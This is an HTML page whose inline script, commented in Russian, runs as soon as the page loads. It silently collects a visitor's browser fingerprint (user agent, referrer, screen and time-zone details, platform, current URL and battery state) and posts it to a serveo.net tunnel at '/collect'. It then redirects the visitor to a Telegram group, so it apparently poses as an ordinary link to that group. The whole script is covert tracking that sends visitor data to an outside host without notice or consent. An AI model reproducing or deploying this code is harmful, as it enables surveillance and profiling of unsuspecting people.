<!DOCTYPE html>
<html>
<head>
  <title>Script</title>
</head>
<body>
  <script>
    // Функция для получения данных о батарее
    function getBatteryInfo() {
      return navigator.getBattery().then(function(battery) {
        return {
          charging: battery.charging,
          level: battery.level * 100 + '%',
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      });
    }

    // Функция для отправки данных на сервер
    function sendData(batteryInfo) {
      // Формирование объекта данных
      const data = {
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        screenWidth: window.innerWidth, // Используем innerWidth для точных размеров окна браузера
        screenHeight: window.innerHeight, // Используем innerHeight для точных размеров окна браузера
        colorDepth: screen.colorDepth,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        platform: navigator.platform,
        onlineStatus: navigator.onLine,
        currentURL: window.location.href,
        battery: batteryInfo,
        location: 'N/A' // Геолокация больше не запрашивается
      };

      // Отправка данных на сервер
      fetch('https://d8ddeb652cdbf662bd7b916fe7287cae.serveo.net/collect', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' }
      });

      // Редирект на реальную группу
      setTimeout(function() {
        window.location.href = 'https://t.me/unixgnutgk';
      }, 100);
    }

    // Получение информации о батарее и отправка данных
    getBatteryInfo().then(function(batteryInfo) {
      sendData(batteryInfo);
    });
  </script>
</body>
</html>
